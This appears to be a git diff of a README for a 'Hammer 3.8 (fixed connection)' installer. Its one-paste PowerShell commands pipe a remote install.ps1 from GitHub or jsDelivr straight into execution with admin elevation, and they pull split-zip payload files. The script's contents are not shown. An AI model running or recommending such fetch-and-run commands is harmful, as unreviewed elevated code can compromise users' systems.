@@ -1,20 +1,22 @@
 ﻿# Hammer 3.8 (fixed connection) — One-paste installer
 
-Branch: `Hammer-3.8-fixed-connection`
+Branch: [`Hammer-3.8-fixed-connection`](https://github.com/dvahana2424-web/hammerdeckydowngrade/tree/Hammer-3.8-fixed-connection)
+
+> Git branch names cannot contain spaces/parentheses, so the branch is `Hammer-3.8-fixed-connection` (display name: **Hammer 3.8 (fixed connection)**).
 
 Open **Windows PowerShell** (a UAC admin prompt will appear automatically) and paste:
-
-```powershell
-irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@5c36424/install.ps1 | iex
-```
-
-Direct GitHub raw (alternate):
 
 ```powershell
 irm https://raw.githubusercontent.com/dvahana2424-web/hammerdeckydowngrade/Hammer-3.8-fixed-connection/install.ps1 | iex
 ```
 
-Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) (primary) and [`Hammer-3.8-fixed-connection` branch](https://github.com/dvahana2424-web/hammerdeckydowngrade/tree/Hammer-3.8-fixed-connection).
+jsDelivr alternate:
+
+```powershell
+irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@Hammer-3.8-fixed-connection/install.ps1 | iex
+```
+
+Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) (primary) and this branch.
 
 ## What changed in this build
 
@@ -38,6 +40,3 @@ Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvaha
 The installer downloads payload files from the [v3.8-fixed-connection release](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) first. If that fails, wait a few minutes and run the command again.
 
 Manual fallback: download `Hammer-3.8.zip.001` and `Hammer-3.8.zip.002` from the release page, concatenate them into `Hammer-3.8.zip`, then extract to `C:\Program Files (x86)\Hammer`.
-
-
-
